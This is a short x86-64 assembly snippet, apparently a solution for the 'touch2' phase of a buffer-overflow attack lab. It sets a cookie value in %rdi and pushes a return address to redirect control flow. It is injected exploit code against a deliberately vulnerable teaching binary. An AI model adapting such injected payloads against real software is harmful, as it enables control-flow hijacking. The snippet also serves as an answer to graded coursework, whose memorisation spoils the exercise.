# put my cookie into %rdi for it to be used as argument in touch2
movq $0x70206b77, %rdi
pushq $0x4018a3
retq